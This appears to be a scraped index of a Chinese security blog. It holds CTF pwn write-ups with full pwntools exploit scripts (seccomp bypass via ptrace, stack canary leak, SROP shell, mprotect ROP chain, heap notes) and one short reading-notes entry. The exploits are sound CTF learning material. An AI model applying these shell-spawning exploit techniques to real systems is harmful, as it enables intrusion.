5) \u003c 0 ) err(1, \"mprotect failed\"); isolate_and_jump((void (__fastcall *)(_QWORD, void *))v3, v5); //开sandbox，然后去执行shellcode return 0; } line CODE JT JF K ================================= 0000: 0x20 0x00 0x00 0x0000000c A = instruction_pointer \u003e\u003e 32 0001: 0x35 0x04 0x00 0x00008000 if (A \u003e= 0x8000) goto 0006 0002: 0x20 0x00 0x00 0x00000000 A = sys_number 0003: 0x15 0x02 0x00 0x0000003d if (A == wait4) goto 0006 0004: 0x15 0x01 0x00 0x00000065 if (A == ptrace) goto 0006 0005: 0x15 0x00 0x01 0x00000039 if (A != fork) goto 0007 0006: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0007: 0x06 0x00 0x00 0x80000000 return KILL_PROCESS 只允许三个系统调用：wait4、ptrace、fork exp: #!/usr/bin/env python3 from pwn import * from time import sleep exe = ELF(\"./pwn\") context.terminal = [\"tmux\", \"splitw\", \"-h\"] context.binary = exe def dbg(r): gdb.attach(r) pause() # DOCKER_PORT = 1337 # REMOTE_NC_CMD = \"nc localhost 444\" # `nc \u003chost\u003e \u003cport\u003e` bstr = lambda x: str(x).encode() ELF.binsh = lambda self: next(self.search(b\"/bin/sh\\0\")) GDB_SCRIPT = \"\"\" set follow-fork-mode child set follow-exec-mode same c \"\"\" def main(): r = process(\"./pwn\") PTRACE_CONT = 7 PTRACE_GETREGS = 12 PTRACE_SETREGS = 13 PTRACE_SYSCALL = 24 RIP_OFFSET = 8*16 shellcode = asm(f\"\"\" mov eax, SYS_fork syscall test eax, eax jz child mov r13, rax mov eax, SYS_wait4 mov rdi, r13 xor esi, esi xor edx, edx xor r10, r10 syscall mov eax, SYS_ptrace mov edi, {PTRACE_SYSCALL} mov rsi, r13 xor edx, edx xor r10, r10 syscall mov eax, SYS_wait4 mov rdi, r13 xor esi, esi xor edx, edx xor r10, r10 syscall mov eax, SYS_ptrace mov edi, {PTRACE_GETREGS} mov rsi, r13 xor edx, edx mov r10, rsp syscall mov rdi, 0x820000000000 lea rbx, [rsp+{RIP_OFFSET}] mov [rbx], rdi mov eax, SYS_ptrace mov edi, {PTRACE_SETREGS} mov rsi, r13 xor edx, edx mov r10, rsp syscall mov eax, SYS_ptrace mov edi, {PTRACE_CONT} mov rsi, r13 xor edx, edx xor r10, r10 syscall mov eax, SYS_wait4 mov rdi, r13 mov rsi, rsp xor edx, edx xor r10, r10 syscall mov eax, SYS_ptrace mov edi, {PTRACE_GETREGS} mov rsi, r13 xor edx, edx mov r10, rsp syscall lea rdi, [rip+sendfile] lea rbx, [rsp+{RIP_OFFSET}] mov [rbx], rdi mov eax, SYS_ptrace mov edi, {PTRACE_SETREGS} mov rsi, r13 xor edx, edx mov r10, rsp syscall mov eax, SYS_ptrace mov edi, {PTRACE_SYSCALL} mov rsi, r13 xor edx, edx xor r10, r10 syscall mov eax, SYS_wait4 mov rdi, r13 xor esi, esi xor edx, edx xor r10, r10 syscall mov eax, SYS_ptrace mov edi, {PTRACE_GETREGS} mov rsi, r13 xor edx, edx mov r10, rsp syscall mov rdi, 0x820000000000 lea rbx, [rsp+{RIP_OFFSET}] mov [rbx], rdi mov eax, SYS_ptrace mov edi, {PTRACE_SETREGS} mov rsi, r13 xor edx, edx mov r10, rsp syscall mov eax, SYS_ptrace mov edi, {PTRACE_CONT} mov rsi, r13 xor edx, edx xor r10, r10 syscall mov eax, SYS_wait4 mov rdi, r13 xor esi, esi xor edx, edx xor r10, r10 syscall hlt child: mov eax, SYS_ptrace xor edi, edi xor esi, esi xor edx, edx xor r10, r10 syscall int3 open: mov eax, SYS_open lea rdi, [rip+flag] xor esi, esi xor edx, edx syscall sendfile: mov rax, SYS_sendfile mov rdi, 1 mov rsi, 3 xor edx, edx mov r10, 0x50 syscall hlt flag: \"\"\") + b\"flag.txt\\0\" dbg(r) r.sendline(bstr(len(shellcode))) r.send(shellcode) r.interactive() if __name__ == \"__main__\": main() shellcode解释： SYS_fork parent_process: wait4 //等待TRACEME PTRACE_SYSCALL //捕获下一次syscall信号，即open的syscall wait4 //等待open的syscall开始 PTRACE_GETREGS //获取寄存器","date":"2025-08-07","objectID":"/posts/trxctf2025/:1:0","series":null,"tags":null,"title":"TRXCTF2025","uri":"/posts/trxctf2025/#canon_event"},{"categories":["WP"],"content":"\rVirtual_Insanity 栈溢出+利用vsyscall 就不写了。。。 ","date":"2025-08-07","objectID":"/posts/trxctf2025/:2:0","series":null,"tags":null,"title":"TRXCTF2025","uri":"/posts/trxctf2025/#virtual_insanity"},{"categories":["reading"],"content":"\r","date":"2025-08-06","objectID":"/posts/read_fzdxj/:0:0","series":null,"tags":null,"title":"【阅读】法治的细节","uri":"/posts/read_fzdxj/#"},{"categories":["reading"],"content":"\r摘录\rquote\r“为什么人很容易飘飘然？因为你浅薄呀 浅薄的东西就是容易飘起来” ——罗翔\rquote\r“我们画不出那个完美的圆，但是我们仍然应当努力，虽不能至心向往之”\rquote\r“我们每个人都并不优越于他人，每个人都是有限的。我们时常需要聆听苏格拉底的德尔菲神谕，承认自己的无知和有限，渺小和幽暗”\rquote\r“本质上，过分的夸奖与过分的批评不都是误解吗？误解本来就是人生常态，不要喜欢好听的误解，而厌恶不好听的误解。”\r","date":"2025-08-06","objectID":"/posts/read_fzdxj/:1:0","series":null,"tags":null,"title":"【阅读】法治的细节","uri":"/posts/read_fzdxj/#摘录"},{"categories":["WP"],"content":" HTB的一个比赛 ","date":"2025-06-06","objectID":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/:0:0","series":null,"tags":null,"title":"Cyber_Apocalypse_CTF_2025_Tales_from_Eldoria","uri":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/#"},{"categories":["WP"],"content":"\rQuack_Quack unsigned __int64 duckling() { char *v1; // [rsp+8h] [rbp-88h] _QWORD buf[4]; // [rsp+10h] [rbp-80h] BYREF _QWORD v3[11]; // [rsp+30h] [rbp-60h] BYREF unsigned __int64 v4; // [rsp+88h] [rbp-8h] v4 = __readfsqword(0x28u); memset(buf, 0, sizeof(buf)); memset(v3, 0, 80); printf(\"Quack the Duck!\\n\\n\u003e \"); fflush(_bss_start); read(0, buf, 0x66u); v1 = strstr((const char *)buf, \"Quack Quack \"); if ( !v1 ) { error(\"Where are your Quack Manners?!\\n\"); exit(1312); } printf(\"Quack Quack %s, ready to fight the Duck?\\n\\n\u003e \", v1 + 32); read(0, v3, 0x6Au); puts(\"Did you really expect to win a fight against a Duck?!\\n\"); return v4 - __readfsqword(0x28u); } unsigned __int64 duck_attack() { char buf; // [rsp+3h] [rbp-Dh] BYREF int fd; // [rsp+4h] [rbp-Ch] unsigned __int64 v3; // [rsp+8h] [rbp-8h] v3 = __readfsqword(0x28u); fd = open(\"./flag.txt\", 0); if ( fd \u003c 0 ) { perror(\"\\nError opening flag.txt, please contact an Administrator\\n\"); exit(1); } while ( read(fd, \u0026buf, 1u) \u003e 0 ) fputc(buf, _bss_start); close(fd); return v3 - __readfsqword(0x28u); } ","date":"2025-06-06","objectID":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/:1:0","series":null,"tags":null,"title":"Cyber_Apocalypse_CTF_2025_Tales_from_Eldoria","uri":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/#quack_quack"},{"categories":["WP"],"content":"\rstrstr函数 #include \u003cstring.h\u003e char *strstr(const char *haystack, const char *needle); 功能：在 haystack（主字符串）中查找 needle（子字符串）的首次出现位置。 返回值： 找到时：返回指向首次匹配位置的指针。 未找到时：返回 NULL。 char *s = \"Hello_CTF_World\"; char *p = strstr(s, \"CTF\"); // p 指向 \"CTF_World\" ","date":"2025-06-06","objectID":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/:1:1","series":null,"tags":null,"title":"Cyber_Apocalypse_CTF_2025_Tales_from_Eldoria","uri":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/#strstr函数"},{"categories":["WP"],"content":"\r思路 通过strstr函数，控制v1指针 让v1+32指向canary，第20行的printf会输出canary read进canary、控制返回地址到duck_attack，输出flag ","date":"2025-06-06","objectID":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/:1:2","series":null,"tags":null,"title":"Cyber_Apocalypse_CTF_2025_Tales_from_Eldoria","uri":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/#思路"},{"categories":["WP"],"content":"\rexp from pwn import * context.terminal = [\"tmux\", \"splitw\", \"-h\"] context(os='linux',arch='amd64',log_level='debug') def dbg(): gdb.attach(p) # pause() address = './quack_quack' p = process(address) elf = ELF(address) libc = elf.libc # ip = \"\" # port = #p = remote(ip,port) backdoor = 0x40137F #canary会以\\x00结尾，所以要加个1 p.recvuntil(b'Quack the Duck!\\n\\n\u003e ') pl = b'a'*(0x80 - 0x8 - 0x20 + 1) + b\"Quack Quack \" # dbg() p.send(pl) p.recvuntil(b'Quack Quack ') canary = u64(p.recv(7).rjust(8,b'\\x00')) #在低位补\\x00 success(\"canary---\u003e 0x%x\",canary) pl = b'a'*(0x60 - 0x8) pl+= p64(canary) pl+=p64(0xdeedbeef) pl+= p16(0x137f) # dbg() p.send(pl) p.interactive() ","date":"2025-06-06","objectID":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/:1:3","series":null,"tags":null,"title":"Cyber_Apocalypse_CTF_2025_Tales_from_Eldoria","uri":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/#exp"},{"categories":["WP"],"content":"\rblessing int __fastcall main(int argc, const char **argv, const char **envp) { size_t size; // [rsp+8h] [rbp-28h] BYREF unsigned __int64 i; // [rsp+10h] [rbp-20h] _QWORD *v6; // [rsp+18h] [rbp-18h] void *buf; // [rsp+20h] [rbp-10h] unsigned __int64 v8; // [rsp+28h] [rbp-8h] v8 = __readfsqword(0x28u); setup(argc, argv, envp); banner(); size = 0; v6 = malloc(0x30000u); *v6 = 1; printstr( \"In the ancient realm of Eldoria, a roaming bard grants you good luck and offers you a gift!\\n\" \"\\n\" \"Please accept this: \"); printf(\"%p\", v6); sleep(1u); for ( i = 0; i \u003c= 0xD; ++i ) { printf(\"\\b \\b\"); usleep(0xEA60u); } puts(\"\\n\"); printf( \"%s[%sBard%s]: Now, I want something in return...\\n\\nHow about a song?\\n\\nGive me the song's length: \", \"\\x1B[1;34m\", \"\\x1B[1;32m\", \"\\x1B[1;34m\"); __isoc99_scanf(\"%lu\", \u0026size); buf = malloc(size); printf(\"\\n%s[%sBard%s]: Excellent! Now tell me the song: \", \"\\x1B[1;34m\", \"\\x1B[1;32m\", \"\\x1B[1;34m\"); read(0, buf, size); *(_QWORD *)((char *)buf + size - 1) = 0; write(1, buf, size); if ( *v6 ) printf(\"\\n%s[%sBard%s]: Your song was not as good as expected...\\n\\n\", \"\\x1B[1;31m\", \"\\x1B[1;32m\", \"\\x1B[1;31m\"); else read_flag(); return 0; } man malloc RETURN VALUE The malloc(), calloc(), realloc(), and reallocarray() functions return a pointer to the allocated memory, which is suitably aligned for any type that fits into the requested size or less. On error, these functions return NULL and set errno. Attempting to allocate more than PTRDIFF_MAX bytes is considered an error, as an object that large could cause later pointer subtraction to overflow. ","date":"2025-06-06","objectID":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/:2:0","series":null,"tags":null,"title":"Cyber_Apocalypse_CTF_2025_Tales_from_Eldoria","uri":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/#blessing"},{"categories":["WP"],"content":"\r思路 程序会输出heap_addr heap_addr很大，malloc(heap_addr)的时候，系统直接拒绝，返回NULL 所以可以控制 (_QWORD *)((char *)buf + size - 1) = v6 就可以让 *v6 = 0，去readflag ","date":"2025-06-06","objectID":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/:2:1","series":null,"tags":null,"title":"Cyber_Apocalypse_CTF_2025_Tales_from_Eldoria","uri":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/#思路-1"},{"categories":["WP"],"content":"\rexp from pwn import * context.terminal = [\"tmux\", \"splitw\", \"-h\"] context(os='linux',arch='amd64',log_level='debug') def dbg(): gdb.attach(p) # pause() address = './blessing' p = process(address) elf = ELF(address) libc = elf.libc # ip = \"\" # port = #p = remote(ip,port) p.recvuntil(b'Please accept this: ') heap_addr = int(p.recv(14),16) success(\"heap_addr = 0x%x\",heap_addr) # dbg() p.sendlineafter(b'length: ',str(heap_addr +1)) p.send(b'a') p.interactive() ","date":"2025-06-06","objectID":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/:2:2","series":null,"tags":null,"title":"Cyber_Apocalypse_CTF_2025_Tales_from_Eldoria","uri":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/#exp-1"},{"categories":["WP"],"content":"\rlaconic 考察SROP 程序就几句汇编 public _start _start proc near mov rdi, 0 ; Alternative name is '_start' ; __start mov rsi, rsp sub rsi, 8 mov rdx, 106h syscall ; LINUX - retn _start endp 可以发现有栈溢出 有发现binsh，但是IDA里没显示 pwndbg\u003e search \"/bin/sh\" Searching for value: '/bin/sh' laconic 0x43238 0x68732f6e69622f /* '/bin/sh' */ 直接execve(\"/bin/sh\",0,0)就可以了 ","date":"2025-06-06","objectID":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/:3:0","series":null,"tags":null,"title":"Cyber_Apocalypse_CTF_2025_Tales_from_Eldoria","uri":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/#laconic"},{"categories":["WP"],"content":"\rexp from pwn import * context.terminal = [\"tmux\", \"splitw\", \"-h\"] context(os='linux',arch='amd64',log_level='debug') def dbg(): gdb.attach(p) # pause() address = './laconic' p = process(address) elf = ELF(address) libc = elf.libc # ip = \"\" # port = #p = remote(ip,port) binsh = 0x43238 pop_rax_ret = 0x43018 syscall_ret = 0x43015 pl = b'a'*8 pl+= p64(pop_rax_ret) pl+= p64(15) pl+=p64(syscall_ret) frame = SigreturnFrame() frame.rax = 0x3b frame.rdi = binsh frame.rsi = 0x0 frame.rdx = 0x0 frame.rip = syscall_ret pl+= bytes(frame) p.send(pl) p.interactive() ","date":"2025-06-06","objectID":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/:3:1","series":null,"tags":null,"title":"Cyber_Apocalypse_CTF_2025_Tales_from_Eldoria","uri":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/#exp-2"},{"categories":["WP"],"content":"\rcrossbow查看两个关键函数 __int64 __fastcall training(__int64 a1, __int64 a2, __int64 a3, __int64 a4, int a5, int a6) { __int64 v6; // rdx __int64 v7; // rcx int v8; // r8d int v9; // r9d int v10; // r8d int v11; // r9d _BYTE v13[32]; // [rsp+0h] [rbp-20h] BYREF printf( (unsigned int)\"%s\\n[%sSir Alaric%s]: You only have 1 shot, don't miss!!\\n\", (unsigned int)\"\\x1B[1;34m\", (unsigned int)\"\\x1B[1;33m\", (unsigned int)\"\\x1B[1;34m\", a5, a6); target_dummy((__int64)v13, (__int64)\"\\x1B[1;34m\", v6, v7, v8, v9); return printf( (unsigned int)\"%s\\n[%sSir Alaric%s]: That was quite a shot!!\\n\\n\", (unsigned int)\"\\x1B[1;34m\", (unsigned int)\"\\x1B[1;33m\", (unsigned int)\"\\x1B[1;34m\", v10, v11); } //这里我省略了一些无关代码 __int64 __fastcall target_dummy(__int64 a1, __int64 a2, __int64 a3, __int64 a4, int a5, int a6) { int v6; // edx int v7; // ecx int v8; // r8d int v9; // r9d int v10; // r8d int v11; // r9d _QWORD *v12; // rbx int v13; // r8d int v14; // r9d __int64 result; // rax int v16; // r8d int v17; // r9d int v18; // [rsp+1Ch] [rbp-14h] BYREF if ( (unsigned int)scanf((unsigned int)\"%d%*c\", (unsigned int)\u0026v18, v6, v7, v8, v9) != 1 ) { printf( (unsigned int)\"%s\\n[%sSir Alaric%s]: Are you aiming for the birds or the target kid?!\\n\\n\", (unsigned int)\"\\x1B[1;31m\", (unsigned int)\"\\x1B[1;33m\", (unsigned int)\"\\x1B[1;31m\", v10, v11); exit(1312); } v12 = (_QWORD *)(8LL * v18 + a1); *v12 = calloc(1, 128); if ( !*v12 ) { printf( (unsigned int)\"%s\\n[%sSir Alaric%s]: We do not want cowards here!!\\n\\n\", (unsigned int)\"\\x1B[1;31m\", (unsigned int)\"\\x1B[1;33m\", (unsigned int)\"\\x1B[1;31m\", v13, v14); exit(6969); } result = fgets_unlocked(*(_QWORD *)(8LL * v18 + a1), 128, \u0026_stdin_FILE); return result; } v12 = (_QWORD *)(8LL * v18 + a1); *v12 = calloc(1, 128); 这里的v18可以通过前面的scanf控制，a1是caller函数（training）的变量v13。v13-0x10(a1-0x10)是target函数(callee)的rbp 这里把v18设置成-0x10，那么，target函数leave;ret的时候，training函数的rbp和training函数的返回地址就会被我们控制(通过fgets_unlocked(*(_QWORD *)(8LL * v18 + a1), 128, \u0026_stdin_FILE);) ","date":"2025-06-06","objectID":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/:4:0","series":null,"tags":null,"title":"Cyber_Apocalypse_CTF_2025_Tales_from_Eldoria","uri":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/#crossbow"},{"categories":["WP"],"content":"\rexp from pwn import * context.terminal = [\"tmux\", \"splitw\", \"-h\"] context(os='linux',arch='amd64',log_level='debug') def dbg(): gdb.attach(p) # pause() address = './crossbow' p = process(address) elf = ELF(address) libc = elf.libc # ip = \"\" # port = #p = remote(ip,port) pop_rax_ret = 0x401001 pop_rdi_ret = 0x401d6c pop_rsi_ret = 0x40566b pop_rdx_ret = 0x401139 syscall_ret = 0x404b51 #mprotect 0xa read 0 fgets = 0x401CC0 stdin = 0x40E020 mprotect_addr = 0x40a320 # dbg() p.recvuntil(b'shoot: ') p.sendline(b'-2') #mprotect给bss段权限7，read读入shellcraft.sh进bss #然后执行shellcode p.recvuntil(b'\u003e ') #mprotect(0x40e000,0x1000,7) pl = b'a'*8 pl += p64(pop_rdi_ret) + p64(0x40e000) pl+= p64(pop_rsi_ret) + p64(0x1000) pl+= p64(pop_rdx_ret) + p64(7) pl+= p64(mprotect_addr) pl+= p64(pop_rdi_ret) + p64(0x40E220) pl+= p64(pop_rsi_ret) + p64(0x100) pl+= p64(pop_rdx_ret) + p64(stdin) pl+= p64(fgets) pl+= p64(0x40e221) # dbg() p.send(pl) # dbg() p.send(asm(shellcraft.sh())) p.interactive() 这里执行shellcode的地址是0x40e221 pwndbg\u003e disassemble /r 0x40e220, 0x40e250 Dump of assembler code from 0x40e220 to 0x40e250: 0x000000000040e220 \u003ccompleted+0\u003e: 00 6a 68 add BYTE PTR [rdx+0x68],ch 0x000000000040e223: 48 b8 2f 00 00 00 00 00 00 00 movabs rax,0x2f 0x000000000040e22d \u003c__sysinfo+5\u003e: 00 00 add BYTE PTR [rax],al pwndbg\u003e disassemble /r 0x40e221, 0x40e230 Dump of assembler code from 0x40e221 to 0x40e230: 0x000000000040e221: 6a 68 push 0x68 0x000000000040e223: 48 b8 2f 00 00 00 00 00 00 00 movabs rax,0x2f 可以看到，从0x40e221开始才是正确的shellcode 可能是fgets_unlock就是这样的： RAX 0x6a RBX 0x40e020 (__stdin_FILE) ◂— 0x49 /* 'I' */ RCX 1 RDX 0x40e301 (buf+1) ◂— add byte ptr [rax], al /* 0xa000000000000 */ RDI 1 RSI 0x743046e24010 —▸ 0x743046e24067 ◂— 0x3f07dd419300946a R8 0x1c R9 0x3d R10 7 R11 0x202 R12 0x40e301 (buf+1) ◂— add byte ptr [rax], al /* 0xa000000000000 */ R13 0x40e300 (buf) ◂— add byte ptr [rax], al /* 0xa00000000000000 */ R14 0 R15 0xfe RBP 0x6161616161616161 ('aaaaaaaa') RSP 0x743046e24080 —▸ 0x40a356 (mprotect+54) ◂— add rsp, 8 *RIP 0x401db6 (fgets_unlocked+246) ◂— mov byte ptr [rdx], al EFLAGS 0x206 [ cf PF af zf sf IF df of ] ─────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]───────────────────────────────────────────────────────────── 0x401ddd \u003cfgets_unlocked+285\u003e call __uflow \u003c__uflow\u003e 0x401de2 \u003cfgets_unlocked+290\u003e test eax, eax 0x6a \u0026 0x6a EFLAGS =\u003e 0x206 [ cf PF af zf sf IF df of ] 0x401de4 \u003cfgets_unlocked+292\u003e js fgets_unlocked+449 \u003cfgets_unlocked+449\u003e 0x401dea \u003cfgets_unlocked+298\u003e mov rdx, r12 RDX =\u003e 0x40e301 (buf+1) ◂— add byte ptr [rax], al /* 0xa000000000000 */ 0x401ded \u003cfgets_unlocked+301\u003e jmp fgets_unlocked+246 \u003cfgets_unlocked+246\u003e ↓ ► 0x401db6 \u003cfgets_unlocked+246\u003e mov byte ptr [rdx], al [buf+1] =\u003e 0x6a 0x401db8 \u003cfgets_unlocked+248\u003e sub r15d, 1 R15D =\u003e 253 (0xfe - 0x1) 0x401dbc \u003cfgets_unlocked+252\u003e lea r12, [rdx + 1] R12 =\u003e 0x40e302 (buf+2) ◂— add byte ptr [rax], al /* 0xa0000000000 */ 0x401dc0 \u003cfgets_unlocked+256\u003e cmp al, 0xa 0x6a - 0xa EFLAGS =\u003e 0x206 [ cf PF af zf sf IF df of ] 0x401dc2 \u003cfgets_unlocked+258\u003e je fgets_unlocked+137 \u003cfgets_unlocked+137\u003e 0x401dc4 \u003cfgets_unlocked+260\u003e test r15d, r15d 0xfd \u0026 0xfd EFLAGS =\u003e 0x202 [ cf pf af zf sf IF df of ] ","date":"2025-06-06","objectID":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/:4:1","series":null,"tags":null,"title":"Cyber_Apocalypse_CTF_2025_Tales_from_Eldoria","uri":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/#exp-3"},{"categories":["WP"],"content":"\rstrategist tcache posioning ","date":"2025-06-06","objectID":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/:5:0","series":null,"tags":null,"title":"Cyber_Apocalypse_CTF_2025_Tales_from_Eldoria","uri":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/#strategist"},{"categories":["WP"],"content":"\r逆向分析\rmenu __int64 menu() { printf( \"%s+-----------------+\\n\" \"| 1. Create plan |\\n\" \"| 2. Show plan |\\n\" \"| 3. Edit plan |\\n\" \"| 4. Delete plan |\\n\" \"+-----------------+\\n\" \"\\n\" \"\u003e \", \"\\x1B[1;34m\"); return read_num(); } create plan先从上往下检查main函数的栈里哪个位置为空，返回给v3。 根据输入的v2，malloc(v2)。 往申请的堆里读入v2大小的内容。 把申请的堆用户地址写入main函数的栈里。 unsigned __int64 __fastcall create_plan(__int64 a1) { int v2; // [rsp+18h] [rbp-18h] BYREF int v3; // [rsp+1Ch] [rbp-14h] void *heap_addr; // [rsp+20h] [rbp-10h] unsigned __int64 v5; // [rsp+28h] [rbp-8h] v5 = __readfsqword(0x28u); v3 = check(a1); //检查main函数栈里从上到下哪个位置为空 if ( v3 == -1 ) { printf(\"%s\\n[%sSir Alaric%s]: Don't go above your head kiddo!\\n\\n\", \"\\x1B[1;31m\", \"\\x1B[1;33m\", \"\\x1B[1;31m\"); exit(1312); } printf(\"%s\\n[%sSir Alaric%s]: How long will be your plan?\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); v2 = 0; __isoc99_scanf(\"%d\", \u0026v2); heap_addr = malloc(v2); if ( !heap_addr ) { printf(\"%s\\n[%sSir Alaric%s]: This plan will be a grand failure!\\n\\n\", \"\\x1B[1;31m\", \"\\x1B[1;33m\", \"\\x1B[1;31m\"); exit(1312); } printf(\"%s\\n[%sSir Alaric%s]: Please elaborate on your plan.\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); read(0, heap_addr, v2); *(a1 + 8LL * v3) = heap_addr; printf( \"%s\\n[%sSir Alaric%s]: The plan might work, we'll keep it in mind.\\n\\n\", \"\\x1B[1;32m\", \"\\x1B[1;33m\", \"\\x1B[1;32m\"); return __readfsqword(0x28u) ^ v5; } show plan根据输入的v2，索引相应的plan并输出存在plan里的内容 unsigned __int64 __fastcall show_plan(__int64 a1) { signed int v2; // [rsp+14h] [rbp-Ch] BYREF unsigned __int64 v3; // [rsp+18h] [rbp-8h] v3 = __readfsqword(0x28u); printf(\"%s\\n[%sSir Alaric%s]: Which plan you want to view?\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); v2 = 0; __isoc99_scanf(\"%d\", \u0026v2); if ( v2 \u003e= 0x64 || !*(8LL * v2 + a1) ) { printf(\"%s\\n[%sSir Alaric%s]: There is no such plan!\\n\\n\", \"\\x1B[1;31m\", \"\\x1B[1;33m\", \"\\x1B[1;31m\"); exit(1312); } printf(\"%s\\n[%sSir Alaric%s]: Plan [%d]: %s\\n\", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\", v2, *(8LL * v2 + a1)); return __readfsqword(0x28u) ^ v3; } edit plan输入v3选择相应plan 根据plan内的内容长度v1，再次read进v1长度的内容 但是这里的strlen存在off-by-one，可以覆盖掉下一个春困 unsigned __int64 __fastcall edit_plan(__int64 a1) { size_t v1; // rax signed int v3; // [rsp+14h] [rbp-Ch] BYREF unsigned __int64 v4; // [rsp+18h] [rbp-8h] v4 = __readfsqword(0x28u); printf(\"%s\\n[%sSir Alaric%s]: Which plan you want to change?\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); v3 = 0; __isoc99_scanf(\"%d\", \u0026v3); if ( v3 \u003e= 0x64 || !*(8LL * v3 + a1) ) { printf(\"%s\\n[%sSir Alaric%s]: There is no such plan!\\n\\n\", \"\\x1B[1;31m\", \"\\x1B[1;33m\", \"\\x1B[1;31m\"); exit(1312); } printf(\"%s\\n[%sSir Alaric%s]: Please elaborate on your new plan.\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); v1 = strlen(*(8LL * v3 + a1)); read(0, *(8LL * v3 + a1), v1); putchar(10); return __readfsqword(0x28u) ^ v4; } delete plan输入v2，在栈中索引相应plan free掉相应的heap 并把存在栈上的heap_pointer置0 unsigned __int64 __fastcall delete_plan(__int64 a1) { signed int v2; // [rsp+14h] [rbp-Ch] BYREF unsigned __int64 v3; // [rsp+18h] [rbp-8h] v3 = __readfsqword(0x28u); printf(\"%s\\n[%sSir Alaric%s]: Which plan you want to delete?\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); v2 = 0; __isoc99_scanf(\"%d\", \u0026v2); if ( v2 \u003e= 0x64 || !*(8LL * v2 + a1) ) { printf(\"%s\\n[%sSir Alaric%s]: There is no such plan!\\n\\n\", \"\\x1B[1;31m\", \"\\x1B[1;33m\", \"\\x1B[1;31m\"); exit(1312); } free(*(8LL * v2 + a1)); *(8LL * v2 + a1) = 0; printf(\"%s\\n[%sSir Alaric%s]: We will remove this plan!\\n\\n\", \"\\x1B[1;32m\", \"\\x1B[1;33m\", \"\\x1B[1;32m\"); return __readfsqword(0x28u) ^ v3; } ","date":"2025-06-06","objectID":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/:5:1","series":null,"tags":null,"title":"Cyber_Apocalypse_CTF_2025_Tales_from_Eldoria","uri":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/#逆向分析"},{"categories":["WP"],"content":"\r逆向分析\rmenu __int64 menu() { printf( \"%s+-----------------+\\n\" \"| 1. Create plan |\\n\" \"| 2. Show plan |\\n\" \"| 3. Edit plan |\\n\" \"| 4. Delete plan |\\n\" \"+-----------------+\\n\" \"\\n\" \"\u003e \", \"\\x1B[1;34m\"); return read_num(); } create plan先从上往下检查main函数的栈里哪个位置为空，返回给v3。 根据输入的v2，malloc(v2)。 往申请的堆里读入v2大小的内容。 把申请的堆用户地址写入main函数的栈里。 unsigned __int64 __fastcall create_plan(__int64 a1) { int v2; // [rsp+18h] [rbp-18h] BYREF int v3; // [rsp+1Ch] [rbp-14h] void *heap_addr; // [rsp+20h] [rbp-10h] unsigned __int64 v5; // [rsp+28h] [rbp-8h] v5 = __readfsqword(0x28u); v3 = check(a1); //检查main函数栈里从上到下哪个位置为空 if ( v3 == -1 ) { printf(\"%s\\n[%sSir Alaric%s]: Don't go above your head kiddo!\\n\\n\", \"\\x1B[1;31m\", \"\\x1B[1;33m\", \"\\x1B[1;31m\"); exit(1312); } printf(\"%s\\n[%sSir Alaric%s]: How long will be your plan?\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); v2 = 0; __isoc99_scanf(\"%d\", \u0026v2); heap_addr = malloc(v2); if ( !heap_addr ) { printf(\"%s\\n[%sSir Alaric%s]: This plan will be a grand failure!\\n\\n\", \"\\x1B[1;31m\", \"\\x1B[1;33m\", \"\\x1B[1;31m\"); exit(1312); } printf(\"%s\\n[%sSir Alaric%s]: Please elaborate on your plan.\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); read(0, heap_addr, v2); *(a1 + 8LL * v3) = heap_addr; printf( \"%s\\n[%sSir Alaric%s]: The plan might work, we'll keep it in mind.\\n\\n\", \"\\x1B[1;32m\", \"\\x1B[1;33m\", \"\\x1B[1;32m\"); return __readfsqword(0x28u) ^ v5; } show plan根据输入的v2，索引相应的plan并输出存在plan里的内容 unsigned __int64 __fastcall show_plan(__int64 a1) { signed int v2; // [rsp+14h] [rbp-Ch] BYREF unsigned __int64 v3; // [rsp+18h] [rbp-8h] v3 = __readfsqword(0x28u); printf(\"%s\\n[%sSir Alaric%s]: Which plan you want to view?\\n\\n\u003e \", 